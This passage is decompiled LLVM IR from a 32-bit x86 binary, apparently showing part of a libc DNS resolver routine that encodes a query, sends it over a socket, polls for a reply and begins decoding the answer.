  %v1_8066f0c = add i32 %v1_8066f06, -12
  %v2_8066f0c = inttoptr i32 %v1_8066f0c to i32*
  store i32 134623208, i32* %v2_8066f0c, align 4
  %v1_8066f11 = add i32 %v1_8066f06, 456
  store i32 %v1_8066f11, i32* @esi, align 4
  %v2_8066f18 = add i32 %v1_8066f06, -16
  %v3_8066f18 = inttoptr i32 %v2_8066f18 to i32*
  store i32 %v1_8066f11, i32* %v3_8066f18, align 4
  %v4_8066f19 = call i32 @_pthread_cleanup_push_defer(i32* %v3_8066f19, i32 %v3_8066e48, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8066f19, i32* %eax.global-to-local, align 4
  %v0_8066f1e = load i32, i32* @esp, align 4
  %v1_8066f1e = inttoptr i32 %v0_8066f1e to i32*
  store i32 ptrtoint (i32* @global_var_8078848.1714 to i32), i32* %v1_8066f1e, align 4
  %v1_8066f25 = call i32 @__pthread_return_0(i32 %v3_8066ee8)
  store i32 %v1_8066f25, i32* @eax, align 4
  %v0_8066f2a = call i32 @__open_nameservers()
  store i32 %v0_8066f2a, i32* %eax.global-to-local, align 4
  %v0_8066f2f = load i32, i32* @global_var_8078c88.1715, align 8
  store i32 %v0_8066f2f, i32* %ecx.global-to-local, align 4
  %v0_8066f35 = load i32, i32* @esp, align 4
  %v1_8066f35 = add i32 %v0_8066f35, 64
  %v2_8066f35 = inttoptr i32 %v1_8066f35 to i32*
  %v3_8066f35 = load i32, i32* %v2_8066f35, align 4
  store i32 %v3_8066f35, i32* %eax.global-to-local, align 4
  %v2_8066f39 = add i32 %v0_8066f35, 32
  %v3_8066f39 = inttoptr i32 %v2_8066f39 to i32*
  %v4_8066f39 = load i32, i32* %v3_8066f39, align 4
  %v5_8066f39 = add i32 %v4_8066f39, %v3_8066f35
  store i32 %v5_8066f39, i32* %eax.global-to-local, align 4
  %v2_8066f3d = add i32 %v0_8066f35, 40
  %v3_8066f3d = inttoptr i32 %v2_8066f3d to i32*
  store i32 %v0_8066f2f, i32* %v3_8066f3d, align 4
  %v0_8066f44 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066f44 = inttoptr i32 %v0_8066f44 to i8*
  store i8 0, i8* %v1_8066f44, align 1
  %v0_8066f47 = load i32, i32* @esp, align 4
  %v1_8066f47 = add i32 %v0_8066f47, 52
  %v2_8066f47 = inttoptr i32 %v1_8066f47 to i32*
  %v3_8066f47 = load i32, i32* %v2_8066f47, align 4
  %v4_8066f47 = load i32, i32* %ecx.global-to-local, align 4
  %v10_8066f47 = icmp ult i32 %v3_8066f47, %v4_8066f47
  %v15_8066f47 = icmp eq i32 %v3_8066f47, %v4_8066f47
  store i1 %v15_8066f47, i1* %zf.global-to-local, align 1
  %v1_8066f4b = icmp eq i1 %v10_8066f47, false
  br i1 %v1_8066f4b, label %dec_label_pc_8066f6a, label %dec_label_pc_8066f4d

dec_label_pc_8066f4d:                             ; preds = %dec_label_pc_8066f06
  %v0_8066f4d = load i32, i32* %eax.global-to-local, align 4
  %v1_8066f4d = inttoptr i32 %v0_8066f4d to i8*
  store i8 46, i8* %v1_8066f4d, align 1
  %v0_8066f50 = load i32, i32* @ebx, align 4
  %v1_8066f50 = load i32, i32* @esp, align 4
  %v2_8066f50 = add i32 %v1_8066f50, -4
  %v3_8066f50 = inttoptr i32 %v2_8066f50 to i32*
  store i32 %v0_8066f50, i32* %v3_8066f50, align 4
  %v0_8066f51 = load i32, i32* @global_var_8078c7c.1716, align 4
  store i32 %v0_8066f51, i32* @eax, align 4
  %v0_8066f56 = load i32, i32* @ebx, align 4
  %v2_8066f56 = add i32 %v1_8066f50, -8
  %v3_8066f56 = inttoptr i32 %v2_8066f56 to i32*
  store i32 %v0_8066f56, i32* %v3_8066f56, align 4
  %v1_8066f57 = add i32 %v1_8066f50, 52
  %v2_8066f57 = inttoptr i32 %v1_8066f57 to i32*
  %v3_8066f57 = load i32, i32* %v2_8066f57, align 4
  store i32 %v3_8066f57, i32* %edx.global-to-local, align 4
  %v0_8066f5b = load i32, i32* @eax, align 4
  %v2_8066f5b = mul i32 %v3_8066f57, 4
  %v3_8066f5b = add i32 %v0_8066f5b, %v2_8066f5b
  %v4_8066f5b = inttoptr i32 %v3_8066f5b to i32*
  %v5_8066f5b = load i32, i32* %v4_8066f5b, align 4
  %v7_8066f5b = add i32 %v1_8066f50, -12
  %v8_8066f5b = inttoptr i32 %v7_8066f5b to i32*
  store i32 %v5_8066f5b, i32* %v8_8066f5b, align 4
  %v1_8066f5e = add i32 %v1_8066f50, 12
  %v2_8066f5e = inttoptr i32 %v1_8066f5e to i32*
  %v3_8066f5e = load i32, i32* %v2_8066f5e, align 4
  %v5_8066f5e = add i32 %v1_8066f50, -16
  %v6_8066f5e = inttoptr i32 %v5_8066f5e to i32*
  store i32 %v3_8066f5e, i32* %v6_8066f5e, align 4
  %v3_8066f62 = call i32 @strcpy(i8* %v3_8066fdb, i32 %v3_8066e48)
  store i32 %v3_8066f62, i32* %eax.global-to-local, align 4
  %v0_8066f67 = load i32, i32* @esp, align 4
  %v1_8066f67 = add i32 %v0_8066f67, 16
  %v6_8066f67 = icmp eq i32 %v1_8066f67, 0
  store i1 %v6_8066f67, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8066f6a

dec_label_pc_8066f6a:                             ; preds = %dec_label_pc_8066f06, %dec_label_pc_8066f4d
  %v1_8066f8b = phi i32 [ %v0_8066f47, %dec_label_pc_8066f06 ], [ %v1_8066f67, %dec_label_pc_8066f4d ]
  %v1_8066f6a = add i32 %v1_8066f8b, 56
  %v2_8066f6a = inttoptr i32 %v1_8066f6a to i32*
  %v3_8066f6a = load i32, i32* %v2_8066f6a, align 4
  %v4_8066f6a = icmp eq i32 %v3_8066f6a, 0
  store i1 %v4_8066f6a, i1* %zf.global-to-local, align 1
  %v5_8066f6a = icmp slt i32 %v3_8066f6a, 0
  %v1_8066f6f = icmp eq i1 %v5_8066f6a, false
  br i1 %v1_8066f6f, label %dec_label_pc_8066f97, label %dec_label_pc_8066f71

dec_label_pc_8066f71:                             ; preds = %dec_label_pc_8066f6a
  %v0_8066f71 = load i8, i8* inttoptr (i32 134683401 to i8*), align 1
  %v0_8066f78 = load i16, i16* @global_var_8071b04.1717, align 4
  %v1_8066f78 = zext i16 %v0_8066f78 to i32
  store i32 %v1_8066f78, i32* %ecx.global-to-local, align 4
  %v0_8066f7f = load i32, i32* @global_var_8078844.1718, align 4
  store i32 %v0_8066f7f, i32* %eax.global-to-local, align 4
  %v1_8066f84 = load i64, i64* @global_var_8078c84.1719, align 8
  %v3_8066f84 = zext i8 %v0_8066f71 to i64
  %v5_8066f84 = mul nsw i64 %v1_8066f84, %v3_8066f84
  %v6_8066f84 = trunc i64 %v5_8066f84 to i32
  store i32 %v6_8066f84, i32* %edx.global-to-local, align 4
  %v2_8066f8b = add i32 %v1_8066f8b, 60
  %v3_8066f8b = inttoptr i32 %v2_8066f8b to i32*
  store i32 %v1_8066f78, i32* %v3_8066f8b, align 4
  %v0_8066f8f = load i32, i32* %eax.global-to-local, align 4
  %v1_8066f8f = load i32, i32* @esp, align 4
  %v2_8066f8f = add i32 %v1_8066f8f, 56
  %v3_8066f8f = inttoptr i32 %v2_8066f8f to i32*
  store i32 %v0_8066f8f, i32* %v3_8066f8f, align 4
  %v0_8066f93 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066f93 = load i32, i32* @esp, align 4
  %v2_8066f93 = add i32 %v1_8066f93, 44
  %v3_8066f93 = inttoptr i32 %v2_8066f93 to i32*
  store i32 %v0_8066f93, i32* %v3_8066f93, align 4
  %v0_8066f97.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8066f97

dec_label_pc_8066f97:                             ; preds = %dec_label_pc_8066f6a, %dec_label_pc_8066f71
  %v1_8066fb2 = phi i32 [ %v1_8066f8b, %dec_label_pc_8066f6a ], [ %v0_8066f97.pre, %dec_label_pc_8066f71 ]
  %v1_8066f97 = add i32 %v1_8066fb2, 56
  %v2_8066f97 = inttoptr i32 %v1_8066f97 to i32*
  %v3_8066f97 = load i32, i32* %v2_8066f97, align 4
  store i32 %v3_8066f97, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8066f9f = add i32 %v1_8066fb2, 60
  %v2_8066f9f = inttoptr i32 %v1_8066f9f to i32*
  %v3_8066f9f = load i32, i32* %v2_8066f9f, align 4
  %v1_8066fa3 = load i64, i64* @global_var_8078c84.1719, align 8
  %v2_8066fa3 = trunc i64 %v1_8066fa3 to i32
  %v8_8066fa3 = icmp ult i32 %v3_8066f97, %v2_8066fa3
  %v1_8066fa9 = icmp eq i1 %v8_8066fa3, false
  %v4_8066fa9 = select i1 %v1_8066fa9, i32 0, i32 %v3_8066f97
  store i32 %v4_8066fa9, i32* %ecx.global-to-local, align 4
  %v1_8066fac = add i32 %v3_8066f9f, 1
  %v1_8066fad = urem i32 %v1_8066fac, 65536
  store i32 %v1_8066fad, i32* %eax.global-to-local, align 4
  store i32 %v1_8066fad, i32* %v2_8066f9f, align 4
  %v0_8066fb6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066fb6 = trunc i32 %v0_8066fb6 to i16
  store i16 %v1_8066fb6, i16* @global_var_8071b04.1717, align 4
  %v1_8066fbc = load i32, i32* %ecx.global-to-local, align 4
  %v3_8066fbc = mul i32 %v1_8066fbc, 28
  store i32 %v3_8066fbc, i32* %eax.global-to-local, align 4
  %v1_8066fbf = load i32, i32* @esp, align 4
  %v2_8066fbf = add i32 %v1_8066fbf, 56
  %v3_8066fbf = inttoptr i32 %v2_8066fbf to i32*
  store i32 %v1_8066fbc, i32* %v3_8066fbf, align 4
  %v0_8066fc3 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8066fc3, i32* @global_var_8078844.1718, align 4
  %v0_8066fc9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066fc9 = load i32, i32* @global_var_8078c80.1720, align 128
  %v2_8066fc9 = add i32 %v1_8066fc9, %v0_8066fc9
  %v12_8066fc9 = icmp eq i32 %v2_8066fc9, 0
  store i1 %v12_8066fc9, i1* %zf.global-to-local, align 1
  store i32 %v2_8066fc9, i32* %eax.global-to-local, align 4
  %v1_8066fcf = load i32, i32* @esp, align 4
  %v2_8066fcf = add i32 %v1_8066fcf, -4
  %v3_8066fcf = inttoptr i32 %v2_8066fcf to i32*
  store i32 %v0_8066fc3, i32* %v3_8066fcf, align 4
  %v1_8066fd0 = add i32 %v1_8066fcf, -8
  %v2_8066fd0 = inttoptr i32 %v1_8066fd0 to i32*
  store i32 28, i32* %v2_8066fd0, align 4
  %v0_8066fd2 = load i32, i32* %eax.global-to-local, align 4
  %v2_8066fd2 = add i32 %v1_8066fcf, -12
  %v3_8066fd2 = inttoptr i32 %v2_8066fd2 to i32*
  store i32 %v0_8066fd2, i32* %v3_8066fd2, align 4
  %v1_8066fd3 = add i32 %v1_8066fcf, 428
  store i32 %v1_8066fd3, i32* %eax.global-to-local, align 4
  %v2_8066fda = add i32 %v1_8066fcf, -16
  %v3_8066fda = inttoptr i32 %v2_8066fda to i32*
  store i32 %v1_8066fd3, i32* %v3_8066fda, align 4
  %v4_8066fdb = call i32 @memcpy(i8* %v3_8066fdb, i32 %v3_8066e48, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8066fdb, i32* %eax.global-to-local, align 4
  %v0_8066fe0 = load i32, i32* @esp, align 4
  %v1_8066fe0 = inttoptr i32 %v0_8066fe0 to i32*
  %v2_8066fe0 = load i32, i32* %v1_8066fe0, align 4
  store i32 %v2_8066fe0, i32* %eax.global-to-local, align 4
  %v3_8066fe0 = add i32 %v0_8066fe0, 4
  %v1_8066fe1 = inttoptr i32 %v3_8066fe0 to i32*
  %v2_8066fe1 = load i32, i32* %v1_8066fe1, align 4
  store i32 %v2_8066fe1, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8066fe1, align 4
  %v0_8066fe4 = load i32, i32* @esi, align 4
  store i32 %v0_8066fe4, i32* %v1_8066fe0, align 4
  %v3_8066fe5 = call i32 @_pthread_cleanup_pop_restore(i32* %v3_8066f19, i32 %v3_8066e48)
  store i32 128, i32* %ecx.global-to-local, align 4
  %v0_8066fef = load i32, i32* @ebx, align 4
  store i32 %v0_8066fef, i32* %eax.global-to-local, align 4
  %v5_8066ff1 = call i8* @_memset(i8* %v1_8066e46, i32 %v0_8066fef, i32 128)
  %v0_8066ff3 = load i32, i32* @esp, align 4
  %v1_8066ff3 = add i32 %v0_8066ff3, 356
  store i32 %v1_8066ff3, i32* %edx.global-to-local, align 4
  store i32 12, i32* %ecx.global-to-local, align 4
  %v2_8066fff = add i32 %v0_8066ff3, 24
  %v3_8066fff = inttoptr i32 %v2_8066fff to i32*
  store i32 %v1_8066ff3, i32* %v3_8066fff, align 4
  %v0_8067003 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067003 = inttoptr i32 %v0_8067003 to i8*
  store i32 %v0_8067003, i32* @edi, align 4
  %v5_8067005 = call i8* @_memset(i8* %v1_8067003, i32 %v0_8066fef, i32 12)
  %v6_8067005 = ptrtoint i8* %v5_8067005 to i32
  store i32 %v6_8067005, i32* %ecx.global-to-local, align 4
  %v0_8067007 = load i32, i32* @esp, align 4
  %v1_8067007 = add i32 %v0_8067007, 76
  %v2_8067007 = inttoptr i32 %v1_8067007 to i32*
  %v3_8067007 = load i32, i32* %v2_8067007, align 4
  store i32 %v3_8067007, i32* %ecx.global-to-local, align 4
  %v1_806700b = add i32 %v0_8067007, 388
  %v2_806700b = inttoptr i32 %v1_806700b to i32*
  store i32 1, i32* %v2_806700b, align 4
  %v0_8067016 = load i32, i32* @esp, align 4
  %v1_8067016 = add i32 %v0_8067016, 376
  %v2_8067016 = inttoptr i32 %v1_8067016 to i32*
  store i32 1, i32* %v2_8067016, align 4
  %v0_8067021 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8067021 = load i32, i32* @esp, align 4
  %v2_8067021 = add i32 %v1_8067021, 356
  %v3_8067021 = inttoptr i32 %v2_8067021 to i32*
  store i32 %v0_8067021, i32* %v3_8067021, align 4
  %v0_8067028 = load i32, i32* @esp, align 4
  %v9_8067028 = icmp eq i32 %v0_8067028, -12
  store i1 %v9_8067028, i1* %zf.global-to-local, align 1
  %v1_806702b = add i32 %v0_8067028, 8
  %v2_806702b = inttoptr i32 %v1_806702b to i32*
  store i32 512, i32* %v2_806702b, align 4
  %v3_8067030 = add i32 %v0_8067028, 4
  %v4_8067030 = inttoptr i32 %v3_8067030 to i32*
  store i32 %v2_8066e3e, i32* %v4_8067030, align 4
  %v1_8067031 = add i32 %v0_8067028, 356
  store i32 %v1_8067031, i32* %eax.global-to-local, align 4
  %v3_8067038 = inttoptr i32 %v0_8067028 to i32*
  store i32 %v1_8067031, i32* %v3_8067038, align 4
  %v0_8067039 = call i32 @__encode_header()
  store i32 %v0_8067039, i32* %eax.global-to-local, align 4
  %v0_806703e = load i32, i32* @esp, align 4
  %v1_806703e = add i32 %v0_806703e, 16
  %v1_8067041 = icmp eq i32 %v0_8067039, 0
  store i1 %v1_8067041, i1* %zf.global-to-local, align 1
  %v2_8067041 = icmp slt i32 %v0_8067039, 0
  store i32 %v0_8067039, i32* @ebx, align 4
  br i1 %v2_8067041, label %dec_label_pc_8067552, label %dec_label_pc_806704b

dec_label_pc_806704b:                             ; preds = %dec_label_pc_8066f97
  %v1_806704b = add i32 %v0_806703e, 64
  %v2_806704b = inttoptr i32 %v1_806704b to i32*
  %v3_806704b = load i32, i32* %v2_806704b, align 4
  store i32 %v3_806704b, i32* %edx.global-to-local, align 4
  %v1_806704f = add i32 %v0_806703e, 532
  %v2_806704f = inttoptr i32 %v1_806704f to i32*
  %v3_806704f = load i32, i32* %v2_806704f, align 4
  store i32 %v3_806704f, i32* %ecx.global-to-local, align 4
  %v1_8067056 = add i32 %v0_806703e, 496
  %v2_8067056 = inttoptr i32 %v1_8067056 to i32*
  store i32 1, i32* %v2_8067056, align 4
  %v0_8067061 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067061 = load i32, i32* @esp, align 4
  %v2_8067061 = add i32 %v1_8067061, 472
  %v3_8067061 = inttoptr i32 %v2_8067061 to i32*
  store i32 %v0_8067061, i32* %v3_8067061, align 4
  %v0_8067068 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8067068 = load i32, i32* @esp, align 4
  %v2_8067068 = add i32 %v1_8067068, 476
  %v3_8067068 = inttoptr i32 %v2_8067068 to i32*
  store i32 %v0_8067068, i32* %v3_8067068, align 4
  %v1_806706f = load i32, i32* @esp, align 4
  %v2_806706f = add i32 %v1_806706f, -4
  %v3_806706f = inttoptr i32 %v2_806706f to i32*
  store i32 %v0_8067039, i32* %v3_806706f, align 4
  %v1_8067075 = load i32, i32* @ebx, align 4
  %v2_8067075 = sub i32 512, %v1_8067075
  %v12_8067075 = icmp eq i32 %v2_8067075, 0
  store i1 %v12_8067075, i1* %zf.global-to-local, align 1
  %v2_8067077 = add i32 %v1_806706f, -8
  %v3_8067077 = inttoptr i32 %v2_8067077 to i32*
  store i32 %v2_8067075, i32* %v3_8067077, align 4
  %v2_8067078 = load i32, i32* @ebx, align 4
  %v3_8067078 = add i32 %v2_8067078, %v2_8066e3e
  %v2_806707c = add i32 %v1_806706f, -12
  %v3_806707c = inttoptr i32 %v2_806707c to i32*
  store i32 %v3_8067078, i32* %v3_806707c, align 4
  %v1_806707d = add i32 %v1_806706f, 472
  store i32 %v1_806707d, i32* @eax, align 4
  %v2_8067084 = add i32 %v1_806706f, -16
  %v3_8067084 = inttoptr i32 %v2_8067084 to i32*
  store i32 %v1_806707d, i32* %v3_8067084, align 4
  %v0_8067085 = call i32 @__encode_question()
  store i32 %v0_8067085, i32* %eax.global-to-local, align 4
  %v0_806708a = load i32, i32* @esp, align 4
  %v1_806708a = add i32 %v0_806708a, 16
  %v1_806708d = icmp eq i32 %v0_8067085, 0
  store i1 %v1_806708d, i1* %zf.global-to-local, align 1
  %v2_806708d = icmp slt i32 %v0_8067085, 0
  store i32 %v0_8067085, i32* @esi, align 4
  br i1 %v2_806708d, label %dec_label_pc_8067552, label %dec_label_pc_8067097

dec_label_pc_8067097:                             ; preds = %dec_label_pc_806704b
  %v2_8067097 = add i32 %v0_806708a, 12
  %v3_8067097 = inttoptr i32 %v2_8067097 to i32*
  store i32 %v0_8067085, i32* %v3_8067097, align 4
  %v1_8067098 = add i32 %v0_806708a, 8
  %v2_8067098 = inttoptr i32 %v1_8067098 to i32*
  store i32 17, i32* %v2_8067098, align 4
  %v1_806709a = add i32 %v0_806708a, 4
  %v2_806709a = inttoptr i32 %v1_806709a to i32*
  store i32 2, i32* %v2_806709a, align 4
  %v1_806709c = add i32 %v0_806708a, 444
  %v2_806709c = inttoptr i32 %v1_806709c to i16*
  %v3_806709c = load i16, i16* %v2_806709c, align 2
  %v4_806709c = zext i16 %v3_806709c to i32
  store i32 %v4_806709c, i32* %eax.global-to-local, align 4
  %v3_80670a4 = inttoptr i32 %v0_806708a to i32*
  store i32 %v4_806709c, i32* %v3_80670a4, align 4
  %v1_80670a5 = call i32 @socket(i32 %v3_8066ee8)
  store i32 %v1_80670a5, i32* @eax, align 4
  %v1_80670aa = load i32, i32* @esp, align 4
  %v2_80670aa = add i32 %v1_80670aa, 48
  %v3_80670aa = inttoptr i32 %v2_80670aa to i32*
  store i32 %v1_80670a5, i32* %v3_80670aa, align 4
  %v0_80670ae = load i32, i32* @esp, align 4
  %v1_80670ae = add i32 %v0_80670ae, 16
  %v1_80670b1 = icmp eq i32 %v1_80670a5, 0
  store i1 %v1_80670b1, i1* %zf.global-to-local, align 1
  %v2_80670b1 = icmp slt i32 %v1_80670a5, 0
  br i1 %v2_80670b1, label %dec_label_pc_8067536, label %dec_label_pc_80670b9

dec_label_pc_80670b9:                             ; preds = %dec_label_pc_8067097
  %v2_80670b9 = add i32 %v0_80670ae, 12
  %v3_80670b9 = inttoptr i32 %v2_80670b9 to i32*
  store i32 %v1_80670a5, i32* %v3_80670b9, align 4
  %v1_80670ba = add i32 %v0_80670ae, 8
  %v2_80670ba = inttoptr i32 %v1_80670ba to i32*
  store i32 28, i32* %v2_80670ba, align 4
  %v1_80670bc = add i32 %v0_80670ae, 444
  store i32 %v1_80670bc, i32* %eax.global-to-local, align 4
  %v2_80670c3 = add i32 %v0_80670ae, 4
  %v3_80670c3 = inttoptr i32 %v2_80670c3 to i32*
  store i32 %v1_80670bc, i32* %v3_80670c3, align 4
  %v1_80670c4 = add i32 %v0_80670ae, 48
  %v2_80670c4 = inttoptr i32 %v1_80670c4 to i32*
  %v3_80670c4 = load i32, i32* %v2_80670c4, align 4
  %v6_80670c4 = inttoptr i32 %v0_80670ae to i32*
  store i32 %v3_80670c4, i32* %v6_80670c4, align 4
  %v3_80670c8 = call i32 @__libc_connect(i32 %v3_8066ee8, i32 %v3_8066e48, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80670c8, i32* @eax, align 4
  %v0_80670cd = load i32, i32* @esp, align 4
  %v1_80670cd = add i32 %v0_80670cd, 16
  %v1_80670d0 = icmp eq i32 %v3_80670c8, 0
  store i1 %v1_80670d0, i1* %zf.global-to-local, align 1
  %v2_80670d0 = icmp slt i32 %v3_80670c8, 0
  br i1 %v2_80670d0, label %dec_label_pc_8067536, label %dec_label_pc_80670d8

dec_label_pc_80670d8:                             ; preds = %dec_label_pc_80670b9
  %v1_80670d8 = add i32 %v0_80670cd, 12
  %v2_80670d8 = inttoptr i32 %v1_80670d8 to i32*
  store i32 0, i32* %v2_80670d8, align 4
  %v0_80670da = load i32, i32* @esi, align 4
  %v1_80670da = load i32, i32* @ebx, align 4
  %v2_80670da = add i32 %v1_80670da, %v0_80670da
  store i32 %v2_80670da, i32* %eax.global-to-local, align 4
  %v2_80670dd = add i32 %v0_80670cd, 8
  %v3_80670dd = inttoptr i32 %v2_80670dd to i32*
  store i32 %v2_80670da, i32* %v3_80670dd, align 4
  %v3_80670de = add i32 %v0_80670cd, 4
  %v4_80670de = inttoptr i32 %v3_80670de to i32*
  store i32 %v2_8066e3e, i32* %v4_80670de, align 4
  %v1_80670df = add i32 %v0_80670cd, 48
  %v2_80670df = inttoptr i32 %v1_80670df to i32*
  %v3_80670df = load i32, i32* %v2_80670df, align 4
  %v6_80670df = inttoptr i32 %v0_80670cd to i32*
  store i32 %v3_80670df, i32* %v6_80670df, align 4
  %v4_80670e3 = call i32 @__libc_send(i32 %v3_8066ee8, i32 %v3_8066e48, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80670e8 = load i8, i8* bitcast (i64* @global_var_8071b08.1721 to i8*), align 8
  %v1_80670e8 = zext i8 %v0_80670e8 to i32
  store i32 %v1_80670e8, i32* @eax, align 4
  %v0_80670ef = load i32, i32* @esp, align 4
  %v1_80670ef = add i32 %v0_80670ef, 16
  %v6_80670ef = icmp eq i32 %v1_80670ef, 0
  store i1 %v6_80670ef, i1* %zf.global-to-local, align 1
  %v1_80670f2 = add i32 %v0_80670ef, 500
  store i32 %v1_80670f2, i32* @esi, align 4
  %v1_80670f9 = add i32 %v0_80670ef, 356
  store i32 %v1_80670f9, i32* @edi, align 4
  %v2_8067100 = zext i8 %v0_80670e8 to i32
  %v3_8067100 = mul nuw nsw i32 %v2_8067100, 1000
  store i32 %v3_8067100, i32* @ebx, align 4
  br label %dec_label_pc_8067106

dec_label_pc_8067106:                             ; preds = %dec_label_pc_806715e, %dec_label_pc_80670d8
  %v0_8067106 = phi i32 [ %v0_8067153, %dec_label_pc_806715e ], [ %v1_80670ef, %dec_label_pc_80670d8 ]
  %v1_8067106 = add i32 %v0_8067106, 32
  %v2_8067106 = inttoptr i32 %v1_8067106 to i32*
  %v3_8067106 = load i32, i32* %v2_8067106, align 4
  store i32 %v3_8067106, i32* %edx.global-to-local, align 4
  %v1_806710a = add i32 %v0_8067106, 488
  %v2_806710a = inttoptr i32 %v1_806710a to i16*
  store i16 1, i16* %v2_806710a, align 2
  %v0_8067114 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067114 = load i32, i32* @esp, align 4
  %v2_8067114 = add i32 %v1_8067114, 484
  %v3_8067114 = inttoptr i32 %v2_8067114 to i32*
  store i32 %v0_8067114, i32* %v3_8067114, align 4
  %v0_806711b = load i32, i32* @eax, align 4
  %v1_806711b = load i32, i32* @esp, align 4
  %v2_806711b = add i32 %v1_806711b, -4
  %v3_806711b = inttoptr i32 %v2_806711b to i32*
  store i32 %v0_806711b, i32* %v3_806711b, align 4
  %v0_806711c = load i32, i32* @ebx, align 4
  %v2_806711c = add i32 %v1_806711b, -8
  %v3_806711c = inttoptr i32 %v2_806711c to i32*
  store i32 %v0_806711c, i32* %v3_806711c, align 4
  %v1_806711d = add i32 %v1_806711b, -12
  %v2_806711d = inttoptr i32 %v1_806711d to i32*
  store i32 1, i32* %v2_806711d, align 4
  %v0_806711f = load i32, i32* @esi, align 4
  %v2_806711f = add i32 %v1_806711b, -16
  %v3_806711f = inttoptr i32 %v2_806711f to i32*
  store i32 %v0_806711f, i32* %v3_806711f, align 4
  %v0_8067120 = call i32 @__GI_poll()
  store i32 %v0_8067120, i32* @eax, align 4
  %v0_8067125 = load i32, i32* @esp, align 4
  %v1_8067125 = add i32 %v0_8067125, 16
  %v1_8067128 = icmp eq i32 %v0_8067120, 0
  store i1 %v1_8067128, i1* %zf.global-to-local, align 1
  %tmp50 = icmp slt i32 %v0_8067120, 1
  br i1 %tmp50, label %dec_label_pc_8067536, label %dec_label_pc_8067130

dec_label_pc_8067130:                             ; preds = %dec_label_pc_8067106
  %v1_8067130 = add i32 %v0_8067125, 12
  %v2_8067130 = inttoptr i32 %v1_8067130 to i32*
  store i32 64, i32* %v2_8067130, align 4
  %v1_8067132 = add i32 %v0_8067125, 8
  %v2_8067132 = inttoptr i32 %v1_8067132 to i32*
  store i32 512, i32* %v2_8067132, align 4
  %v3_8067137 = add i32 %v0_8067125, 4
  %v4_8067137 = inttoptr i32 %v3_8067137 to i32*
  store i32 %v2_8066e3e, i32* %v4_8067137, align 4
  %v1_8067138 = add i32 %v0_8067125, 48
  %v2_8067138 = inttoptr i32 %v1_8067138 to i32*
  %v3_8067138 = load i32, i32* %v2_8067138, align 4
  %v6_8067138 = inttoptr i32 %v0_8067125 to i32*
  store i32 %v3_8067138, i32* %v6_8067138, align 4
  %v4_806713c = call i32 @__libc_recv(i32 %v3_8066ee8, i32 %v3_8066e48, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_806713c, i32* @eax, align 4
  %v1_8067141 = load i32, i32* @esp, align 4
  %v2_8067141 = add i32 %v1_8067141, 52
  %v3_8067141 = inttoptr i32 %v2_8067141 to i32*
  store i32 %v4_806713c, i32* %v3_8067141, align 4
  %v0_8067145 = load i32, i32* @esp, align 4
  %v1_8067145 = add i32 %v0_8067145, 16
  %v0_8067148 = load i32, i32* @eax, align 4
  %v1_8067148 = add i32 %v0_8067148, -11
  %v6_8067148 = sub i32 10, %v0_8067148
  %v7_8067148 = and i32 %v6_8067148, %v0_8067148
  %v8_8067148 = icmp slt i32 %v7_8067148, 0
  %v9_8067148 = icmp eq i32 %v1_8067148, 0
  store i1 %v9_8067148, i1* %zf.global-to-local, align 1
  %v10_8067148 = icmp slt i32 %v1_8067148, 0
  %v3_806714b = icmp eq i1 %v10_8067148, %v8_8067148
  %v4_806714b = icmp eq i1 %v9_8067148, false
  %v5_806714b = and i1 %v4_806714b, %v3_806714b
  br i1 %v5_806714b, label %dec_label_pc_8067168, label %dec_label_pc_806714d

dec_label_pc_806714d:                             ; preds = %dec_label_pc_8067181, %dec_label_pc_8067168, %dec_label_pc_8067130
  %v0_8067153 = phi i32 [ %v1_8067171, %dec_label_pc_8067181 ], [ %v1_8067171, %dec_label_pc_8067168 ], [ %v1_8067145, %dec_label_pc_8067130 ]
  %v0_806714d = load i32, i32* @ebx, align 4
  %v1_806714d = add i32 %v0_806714d, -1000
  %v9_806714d = icmp eq i32 %v1_806714d, 0
  store i32 %v1_806714d, i32* @ebx, align 4
  %v1_8067153 = add i32 %v0_8067153, 36
  %v2_8067153 = inttoptr i32 %v1_8067153 to i32*
  %v3_8067153 = load i32, i32* %v2_8067153, align 4
  %v4_8067153 = icmp eq i32 %v3_8067153, 0
  store i1 %v4_8067153, i1* %zf.global-to-local, align 1
  %v5_8067153 = icmp slt i32 %v3_8067153, 0
  br i1 %v5_8067153, label %dec_label_pc_8067536, label %dec_label_pc_806715e

dec_label_pc_806715e:                             ; preds = %dec_label_pc_806714d
  store i1 %v9_806714d, i1* %zf.global-to-local, align 1
  br i1 %v9_806714d, label %dec_label_pc_8067536, label %dec_label_pc_8067106

dec_label_pc_8067168:                             ; preds = %dec_label_pc_8067130
  %v0_8067168 = load i32, i32* @ecx, align 4
  %v2_8067168 = add i32 %v0_8067145, 12
  %v3_8067168 = inttoptr i32 %v2_8067168 to i32*
  store i32 %v0_8067168, i32* %v3_8067168, align 4
  %v0_8067169 = load i32, i32* @ecx, align 4
  %v2_8067169 = add i32 %v0_8067145, 8
  %v3_8067169 = inttoptr i32 %v2_8067169 to i32*
  store i32 %v0_8067169, i32* %v3_8067169, align 4
  %v0_806716a = load i32, i32* @edi, align 4
  %v2_806716a = add i32 %v0_8067145, 4
  %v3_806716a = inttoptr i32 %v2_806716a to i32*
  store i32 %v0_806716a, i32* %v3_806716a, align 4
  %v4_806716b = inttoptr i32 %v0_8067145 to i32*
  store i32 %v2_8066e3e, i32* %v4_806716b, align 4
  %v0_806716c = call i32 @__decode_header()
  store i32 %v0_806716c, i32* @eax, align 4
  %v0_8067171 = load i32, i32* @esp, align 4
